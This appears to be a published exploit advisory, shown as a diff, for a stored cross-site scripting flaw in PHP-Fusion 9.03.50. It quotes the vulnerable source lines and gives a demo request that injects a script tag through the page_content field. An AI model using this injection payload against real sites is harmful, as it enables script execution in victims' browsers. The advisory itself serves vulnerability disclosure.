@@ -1,0 +1,49 @@
+﻿---------------------------------------------------------
+# Exploit Title: PHP-Fusion Version 9.03.50 - 'CustomPage.inc' Cross-Site Scripting
+# Google Dork: N/A
+# Date: 2020-04-22
+# Exploit Author: Unkn0wn
+# Vendor Homepage: https://www.php-fusion.co.uk
+# Software Link: https://www.php-fusion.co.uk/php_fusion_9_downloads.php
+# Version: 9.03.50
+# Tested on: XAMPP - Win
+# CVE : N/A
+---------------------------------------------------------
+In file:
+includes/classes/PHPFusion/CustomPage.inc (custom_page.php)
+Line 149 - 162:
+
+*
+$data = [
+                'page_id'             => form_sanitizer($_POST['page_id'], 0, 'page_id'),
+                'link_id'             => form_sanitizer($_POST['link_id'], 0, 'link_id'),
+                'link_order'          => form_sanitizer($_POST['link_order'], 0, 'link_order'),
+                'page_link_cat'       => form_sanitizer((isset($_POST['page_link_cat'])) ? $_POST['page_link_cat'] : 0, 0, 'page_link_cat'),
+                'page_title'          => form_sanitizer($_POST['page_title'], '', 'page_title'),
+                'page_access'         => form_sanitizer($_POST['page_access'], 0, 'page_access'),
+
+                'page_content'        => form_sanitizer($_POST['page_content'], "", "page_content"),
+
+                'page_keywords'       => form_sanitizer($_POST['page_keywords'], '', 'page_keywords'),
+                //'page_language' => implode('.', isset($_POST['page_language']) ? \defender::sanitize_array($_POST['page_language']) : array()),
+                'page_language'       => isset($_POST['page_language']) ? form_sanitizer($_POST['page_language'], '', 'page_language') : LANGUAGE,
+                'page_allow_comments' => isset($_POST['page_allow_comments']) ? 1 : 0,
+                'page_allow_ratings'  => isset($_POST['page_allow_ratings']) ? 1 : 0
+            ];
+*
+
+Parameter:
+page_content
+
+In finish echo this parameter in line 198:
+*
+echo form_textarea('page_content', '', $data['page_content'], $textArea_config);
+*
+
+Demo:
+fusion_token=1-1590665421-39b22dba3223554536ae6878fea33ee87ce2d8e876b8d29b2c1747303aac4a63&form_id=inputform&fusion_2tEuz2=&page_id=1&page_title=0x9a&page_keywords=&page_content-insertimage=&page_content=<script>alert('Unkn0wn')</script>&page_language[]=English&page_status=1&page_access=0&page_datestamp=5-27-2020 8:31:01&page_cat=0&save=Save
+----------------------------------------------------------
+# Contact : 0x9a@tuta.io
+# Discovred : Unkn0wn
+# Visit: https://t.me/The_Umbrella
+
